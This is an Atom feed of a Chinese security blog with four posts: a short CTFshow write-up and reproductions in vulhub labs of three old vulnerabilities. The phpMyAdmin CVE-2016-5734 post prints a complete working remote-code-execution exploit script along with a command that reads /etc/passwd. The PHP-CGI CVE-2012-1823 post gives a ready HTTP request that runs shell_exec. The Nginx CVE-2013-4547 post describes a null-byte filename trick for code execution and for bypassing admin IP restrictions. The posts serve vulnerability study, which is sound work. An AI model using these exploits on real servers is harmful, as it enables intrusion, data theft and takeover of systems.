<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lewiserii&#39;s blog</title>
  
  
  <link href="https://lewiserii.github.io/atom.xml" rel="self"/>
  
  <link href="https://lewiserii.github.io/"/>
  <updated>2021-06-16T01:29:44.978Z</updated>
  <id>https://lewiserii.github.io/</id>
  
  <author>
    <name>lewiserii</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTFshow-群友挑战-wp</title>
    <link href="https://lewiserii.github.io/2021/06/16/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/"/>
    <id>https://lewiserii.github.io/2021/06/16/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/</id>
    <published>2021-06-16T04:00:00.000Z</published>
    <updated>2021-06-16T01:29:44.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFshow福利抽奖"><a href="#CTFshow福利抽奖" class="headerlink" title="CTFshow福利抽奖"></a>CTFshow福利抽奖</h1><p>好家伙，打开容器就是flag，但是群主把提交的框隐藏了<br><img src="https://www.hualigs.cn/image/60c9468378bef.jpg"></p><p>观察URL中的数字，发现这一题的value是1089<br><img src="https://www.hualigs.cn/image/60c946f21845e.jpg"></p><p>打开其他任意一题，修改challenge-id的value值，提交成功<br><img src="https://www.hualigs.cn/image/60c94fbb865f5.jpg"></p><h1 id="富婆我来了"><a href="#富婆我来了" class="headerlink" title="富婆我来了"></a>富婆我来了</h1><p>根据提示，在群文件下载文件<br><img src="https://www.hualigs.cn/image/60c94fc38bce6.jpg"></p><p>将附件内容与群文件内容一一对应，找到中文即可</p><blockquote><p>214,1—&gt;我<br>221,7—&gt;也<br>233,35—&gt;想<br>15,45—&gt;找<br>65,67—&gt;三<br>57,37—&gt;十<br>115,27—&gt;六<br>229,8—&gt;迪<br>232,27—&gt;的<br>101,48—&gt;富<br>124,94—&gt;婆</p></blockquote><h1 id="病毒我来了"><a href="#病毒我来了" class="headerlink" title="病毒我来了"></a>病毒我来了</h1><p>解压后直接用010或者strings可以看到flag就在最后，不过是16进制的，转成字符串即可</p><h1 id="FW我来了"><a href="#FW我来了" class="headerlink" title="FW我来了"></a>FW我来了</h1><p>notepad++或其他编辑器打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[&#123;000214A0-0000-0000-C000-000000000046&#125;]</span><br><span class="line">Prop3=19,2</span><br><span class="line">[InternetShortcut]</span><br><span class="line">Modified=63746673686f777b666c61675f69735f6c6f76657d</span><br><span class="line">IconFile=C:\WINDOWS\system32\SHELL32.dll</span><br><span class="line">IconIndex=10</span><br><span class="line">IDList=</span><br><span class="line">URL=https://ctf.show/</span><br></pre></td></tr></table></figure><p>将modified的值转字符串即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFshow福利抽奖&quot;&gt;&lt;a href=&quot;#CTFshow福利抽奖&quot; class=&quot;headerlink&quot; title=&quot;CTFshow福利抽奖&quot;&gt;&lt;/a&gt;CTFshow福利抽奖&lt;/h1&gt;&lt;p&gt;好家伙，打开容器就是flag，但是群主把提交的框隐藏了&lt;br&gt;&lt;im</summary>
      
    
    
    
    <category term="wp" scheme="https://lewiserii.github.io/categories/wp/"/>
    
    
    <category term="wp,ctfshow" scheme="https://lewiserii.github.io/tags/wp-ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</title>
    <link href="https://lewiserii.github.io/2021/06/12/CVE-2016-5734/"/>
    <id>https://lewiserii.github.io/2021/06/12/CVE-2016-5734/</id>
    <published>2021-06-12T04:00:00.000Z</published>
    <updated>2021-06-12T07:35:03.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。</p><p>在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>4.0.10.16之前4.0.x版本<br>4.4.15.7之前4.4.x版本<br>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）<br>Php 5.0 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>采用vulhub搭建<br>直接运行POC：</p><p>python poc.py -u root -p “root” URL -c “system(‘cat /etc/passwd’)”</p><p><img src="https://www.hualigs.cn/image/60c310adc00fc.jpg"></p><p>POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span><br><span class="line">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span><br><span class="line">CVE: CVE-2016-5734</span><br><span class="line">Author: https://twitter.com/iamsecurity</span><br><span class="line">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">__author__ = &quot;@iamsecurity&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&quot;url&quot;, type=str, help=&quot;URL with path to PMA&quot;)</span><br><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, type=str, help=&quot;PHP command(s) to eval()&quot;)</span><br><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--user&quot;, required=True, type=str, help=&quot;Valid PMA user&quot;)</span><br><span class="line">    parser.add_argument(&quot;-p&quot;, &quot;--pwd&quot;, required=True, type=str, help=&quot;Password for valid PMA user&quot;)</span><br><span class="line">    parser.add_argument(&quot;-d&quot;, &quot;--dbs&quot;, type=str, help=&quot;Existing database at a server&quot;)</span><br><span class="line">    parser.add_argument(&quot;-T&quot;, &quot;--table&quot;, type=str, help=&quot;Custom table name for exploit.&quot;)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    if arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    else:</span><br><span class="line">        db = &quot;test&quot;</span><br><span class="line">    token = False</span><br><span class="line">    custom_table = False</span><br><span class="line">    if arguments.table:</span><br><span class="line">        custom_table = True</span><br><span class="line">        table = arguments.table</span><br><span class="line">    else:</span><br><span class="line">        table = &quot;prgpwn&quot;</span><br><span class="line">    if arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    else:</span><br><span class="line">        payload = &quot;system(&#x27;uname -a&#x27;);&quot;</span><br><span class="line"></span><br><span class="line">    size = 32</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    # you can manually add proxy support it&#x27;s very simple ;)</span><br><span class="line">    # s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    s.verify = False</span><br><span class="line">    sql = &#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span><br><span class="line">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span><br><span class="line">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span><br><span class="line">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span><br><span class="line">    &#x27;&#x27;&#x27;.format(table)</span><br><span class="line"></span><br><span class="line">    # get_token</span><br><span class="line">    resp = s.post(url_to_pma + &quot;/?lang=en&quot;, dict(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    if resp.status_code is 200:</span><br><span class="line">        token_place = resp.text.find(&quot;token=&quot;) + 6</span><br><span class="line">        token = resp.text[token_place:token_place + 32]</span><br><span class="line">    if token is False:</span><br><span class="line">        print(&quot;Cannot get valid authorization token.&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    if custom_table is False:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;is_js_confirmed&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;db&quot;: db,</span><br><span class="line">            &quot;token&quot;: token,</span><br><span class="line">            &quot;pos&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;sql_query&quot;: sql,</span><br><span class="line">            &quot;sql_delimiter&quot;: &quot;;&quot;,</span><br><span class="line">            &quot;show_query&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;fk_checks&quot;: &quot;0&quot;,</span><br><span class="line">            &quot;SQL&quot;: &quot;Go&quot;,</span><br><span class="line">            &quot;ajax_request&quot;: &quot;true&quot;,</span><br><span class="line">            &quot;ajax_page_request&quot;: &quot;true&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + &quot;/import.php&quot;, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        if resp.status_code == 200:</span><br><span class="line">            if &quot;success&quot; in resp.json():</span><br><span class="line">                if resp.json()[&quot;success&quot;] is False:</span><br><span class="line">                    first = resp.json()[&quot;error&quot;][resp.json()[&quot;error&quot;].find(&quot;&lt;code&gt;&quot;)+6:]</span><br><span class="line">                    error = first[:first.find(&quot;&lt;/code&gt;&quot;)]</span><br><span class="line">                    if &quot;already exists&quot; in error:</span><br><span class="line">                        print(error)</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;ERROR: &quot; + error)</span><br><span class="line">                        sys.exit(1)</span><br><span class="line">    # build exploit</span><br><span class="line">    exploit = &#123;</span><br><span class="line">        &quot;db&quot;: db,</span><br><span class="line">        &quot;table&quot;: table,</span><br><span class="line">        &quot;token&quot;: token,</span><br><span class="line">        &quot;goto&quot;: &quot;sql.php&quot;,</span><br><span class="line">        &quot;find&quot;: &quot;0/e\0&quot;,</span><br><span class="line">        &quot;replaceWith&quot;: payload,</span><br><span class="line">        &quot;columnIndex&quot;: &quot;0&quot;,</span><br><span class="line">        &quot;useRegex&quot;: &quot;on&quot;,</span><br><span class="line">        &quot;submit&quot;: &quot;Go&quot;,</span><br><span class="line">        &quot;ajax_request&quot;: &quot;true&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + &quot;/tbl_find_replace.php&quot;, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    if resp.status_code == 200:</span><br><span class="line">        result = resp.json()[&quot;message&quot;][resp.json()[&quot;message&quot;].find(&quot;&lt;/a&gt;&quot;)+8:]</span><br><span class="line">        if len(result):</span><br><span class="line">            print(&quot;result: &quot; + result)</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        print(</span><br><span class="line">            &quot;Exploit failed!\n&quot;</span><br><span class="line">            &quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span><br><span class="line">            &quot;Remember that servers with PHP version greater than 5.4.6&quot;</span><br><span class="line">            &quot; is not exploitable, because of warning about null byte in regexp&quot;</span><br><span class="line">        )</span><br><span class="line">        sys.exit(1)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h1&gt;&lt;p&gt;phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替</summary>
      
    
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</title>
    <link href="https://lewiserii.github.io/2021/06/11/CVE-2012-1823/"/>
    <id>https://lewiserii.github.io/2021/06/11/CVE-2012-1823/</id>
    <published>2021-06-11T04:00:00.000Z</published>
    <updated>2021-06-12T07:34:52.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-漏洞说明"><a href="#0x01-漏洞说明" class="headerlink" title="0x01 漏洞说明"></a>0x01 漏洞说明</h1><p>漏洞影响版本<br>php &lt; 5.3.12 or php &lt; 5.4.2<br>CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中。</p><h1 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h1><p>这个漏洞简单来说，就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果。</p><p>RFC3875中规定，当querystring中不包含没有解码的=号的情况下，要将querystring作为cgi的参数传入。所以Apache服务器按要求实现了这个功能。但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。但开发者是为了方便使用类似#!/usr/local/bin/php-cgi -d include_path=/path的写法来进行测试，认为不应该限制php-cgi接受命令行参数，而且这个功能不和其他代码有任何冲突。</p><p>于是，源程序中的if(!cgi) getopt(…)被删掉了。</p><p>根据RFC中对于command line的说明，命令行参数不光可以通过#!/usr/local/bin/php-cgi -d include_path=/path的方式传入php-cgi，更可以通过querystring的方式传入。</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><ul><li>CGI模式下的参数：<ul><li>-c 指定php.ini文件的位置</li><li>-n 不要加载php.ini文件</li><li>-d 指定配置项</li><li>-b 启动fastcgi进程</li><li>-s 显示文件源码</li><li>-T 执行指定次该文件</li><li>-h和-？ 显示帮助</li></ul></li></ul><p>访问 URL/index.php?-s ，爆出源码，说明漏洞存在。发送如下数据包，可见Body中的代码已被执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60c2e316c77be.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-漏洞说明&quot;&gt;&lt;a href=&quot;#0x01-漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞说明&quot;&gt;&lt;/a&gt;0x01 漏洞说明&lt;/h1&gt;&lt;p&gt;漏洞影响版本&lt;br&gt;php &amp;lt; 5.3.12 or php &amp;lt; 5.4.</summary>
      
    
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 文件名逻辑漏洞（CVE-2013-4547）</title>
    <link href="https://lewiserii.github.io/2021/06/11/CVE-2013-4547/"/>
    <id>https://lewiserii.github.io/2021/06/11/CVE-2013-4547/</id>
    <published>2021-06-11T04:00:00.000Z</published>
    <updated>2021-06-12T07:49:02.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，</p><p>错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p><p>举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。而存在</p><p>CVE-2013-4547的情况下，我们请求 1.gif[0x20][0x00].php ，这个URI可以匹配上正则 .php$，</p><p>可以进入这个Location块；但进入后，由于fastcgi在查找文件时被\0截断，Nginx却错误地认为</p><p>请求的文件是1.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi。</p><p>fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。</p><p>所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。</p><p>再举个例子，比如很多网站限制了允许访问后台的IP：</p><p>location /admin/ {<br>    allow 127.0.0.1;<br>    deny all;<br>}<br>我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，</p><p>也就绕过了其中的IP验证；但最后请求的是 /test[0x20]/../admin/index.php 文件，也就是/admin/index.php，</p><p>成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，</p><p>则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p><p>简单来说就是我们构造：<a href="http://127.0.0.1/test.aaa">http://127.0.0.1/test.aaa</a> \0bbb</p><p>让Nginx认为文件“file.aaa ”的后缀为“.bbb”。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>我们上传一个1.txt，注意后面的空格：</p><p><img src="https://www.hualigs.cn/image/60c45e4a3676f.jpg"></p><p>访问URL/uploadfiles/1.gif[0x20][0x00].php，即可发现PHP已被解析：</p><p><img src="https://www.hualigs.cn/image/60c45e4a2c2ec.jpg"></p><p><img src="https://www.hualigs.cn/image/60c462efd0869.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h1&gt;&lt;p&gt;这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，&lt;/p&gt;
</summary>
      
    
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://lewiserii.github.io/tags/CVE/"/>
    
  </entry>
  
</feed>
